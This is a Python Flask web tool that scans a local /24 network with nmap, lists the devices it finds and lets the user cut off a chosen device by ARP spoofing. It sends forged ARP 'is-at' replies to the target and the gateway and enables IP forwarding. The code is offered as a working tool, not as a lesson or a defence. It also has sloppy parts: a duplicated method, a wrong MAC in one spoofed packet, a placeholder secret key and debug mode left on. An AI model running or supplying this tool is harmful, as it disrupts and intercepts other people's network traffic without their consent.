import re
import sys
import time
import json
import nmap
import requests
import subprocess
from flask import Flask, render_template, request, redirect
from flask_wtf import FlaskForm
from wtforms import SelectField, SubmitField
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, send
from colorama import Fore
import threading
import platform


class RestrictForm(FlaskForm):
    device_choices = []
    device_select = SelectField('Select Device', choices=device_choices)
    submit = SubmitField('Restrict Connectivity')

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key'

class ARPSpoofer:
    def __init__(self, gateway, ip_address):
        self.gateway = gateway
        self.ip_address = ip_address
        self.is_interrupted = False

    def is_valid(self):
        reg = \
            r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
        return re.match(reg, self.gateway) and re.match(reg, self.ip_address)

    @staticmethod
    def set_forwarding(value):
        if platform.system() in ["Linux", "Darwin"]:
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "r+") as file:
                    file.write(value)
            except FileNotFoundError:
                print("[!] File /proc/sys/net/ipv4/ip_forward not found. IP forwarding might not be supported on this system.")

    @staticmethod
    def set_forwarding(value):
        if platform.system() in ["Linux", "Darwin"]:
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "r+") as file:
                    file.write(value)
            except FileNotFoundError:
                print("[!] File /proc/sys/net/ipv4/ip_forward not found. IP forwarding might not be supported on this system.")
            except Exception as e:
                print(f"[!] An error occurred: {e}")

    @staticmethod
    def get_mac(ip_address):
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address)
        answer, _ = srp(packet, timeout=5, verbose=False)
        if len(answer) > 0:
            return answer[0][1].hwsrc
        return None

    def spoof(self):
        target_mac = self.get_mac(self.ip_address)
        if not target_mac:
            log_and_exit(f"{Fore.RED}[!] Unable to get MAC Address..")
        # Starting forwarding
        self.set_forwarding("1")
        while True:
            try:
                # Start spoofing process
                time.sleep(1)
                if not self.is_interrupted:
                    send(ARP(pdst=self.ip_address, hwdst=target_mac, psrc=self.gateway, op="is-at"), verbose=0)
                    send(ARP(pdst=self.gateway, hwdst=target_mac, psrc=self.ip_address, op="is-at"), verbose=0)
                    print(f"{Fore.YELLOW}[+] (ARP) Spoofing {self.ip_address}... [-] MAC Address: {target_mac}")
            except KeyboardInterrupt:
                self.is_interrupted = True
                self.unspoof()
                
    def unspoof(self):
        target_mac = self.get_mac(self.ip_address)
        if not target_mac:
            log_and_exit(f"{Fore.RED}[!] Unable to get MAC Address..")

        # Stop spoofing
        self.is_interrupted = True

        # Restore network
        arp = ARP(pdst=self.ip_address, hwdst=target_mac, psrc=self.gateway, hwsrc=self.get_mac(self.gateway))
        send(arp, verbose=1)
        self.set_forwarding("0")  # Disable IP forwarding

        print(f"\n{Fore.LIGHTGREEN_EX}[*] Network Restored!\n")

    def spoof_in_background(self):
        threading.Thread(target=self.spoof).start()

    def unspoof_in_background(self):
        threading.Thread(target=self.unspoof).start()

@app.route('/restrict', methods=['POST'])
def restrict():
    ip_address = request.form['ip']
    mac_address = request.form['mac']
    restrict_connectivity(ip_address, mac_address)
    return redirect('/')
                
def log_and_exit(text):
    print(text)
    sys.exit(1)

def run_nmap_scan(ip_range):
    nm = nmap.PortScanner()
    nm.scan(hosts=ip_range, arguments='-sn')
    return nm.all_hosts(), nm

def parse_nmap_output(nmap_hosts, nm):
    devices = []
    for host in nmap_hosts:
        ip = host
        mac = nm[host]['addresses'].get('mac', 'Unknown')
        manufacturer = nm[host]['vendor'] if 'vendor' in nm[host] else 'Unknown'
        hostname = nm[host]['hostnames'][0]['name'] if 'hostnames' in nm[host] and nm[host]['hostnames'] else 'Unknown'
        device_info = {
            'device_name': get_device_name(mac),
            'ip': ip,
            'mac': mac,
            'manufacturer': manufacturer,
            'hostname': hostname
        }
        devices.append(device_info)
    return devices

def get_device_name(mac_address):
    try:
        url = f'https://api.macvendors.com/{mac_address}'
        response = requests.get(url)
        if response.status_code == 200:
            return response.text.strip()
        else:
            return 'Unknown'
    except requests.RequestException as e:
        print(f"An error occurred: {e}")
        return 'Unknown'

@app.route('/', methods=['GET', 'POST'])
def index():
    form = RestrictForm()
    nmap_hosts, nm = run_nmap_scan('192.168.1.0/24')
    nmap_devices = parse_nmap_output(nmap_hosts, nm) if nmap_hosts else []
    form.device_choices = [(f"{device['device_name']} ({device['mac']})", f"{device['ip']}_{device['mac']}") for device in nmap_devices]
    form.process()
    if form.validate_on_submit():
        selected_device = request.form['device_select'].split('_')
        restrict_connectivity(selected_device[0], selected_device[1])

    return render_template('index.html', form=form, nmap_devices=nmap_devices)

@app.route('/unrestrict', methods=['POST'])
def unrestrict():
    ip_address = request.form['ip']
    mac_address = request.form['mac']
    unrestrict_connectivity(ip_address, mac_address)
    return redirect('/')

def unrestrict_connectivity(ip_address, mac_address):
    instance = ARPSpoofer('192.168.1.1', ip_address)  # replace '192.168.1.1' with your gateway IP
    if instance.is_valid():
        instance.unspoof_in_background()
    else:
        print(Fore.RED + f"{Fore.RED}[!] Invalid IP. Please try again!")

def restrict_connectivity(ip_address, mac_address):
    instance = ARPSpoofer('192.168.1.1', ip_address)  # replace '192.168.1.1' with your gateway IP
    if instance.is_valid():
        instance.spoof_in_background()
    else:
        print(Fore.RED + f"{Fore.RED}[!] Invalid IP. Please try again!")

if __name__ == "__main__":
    app.run(debug=True, port=8090)
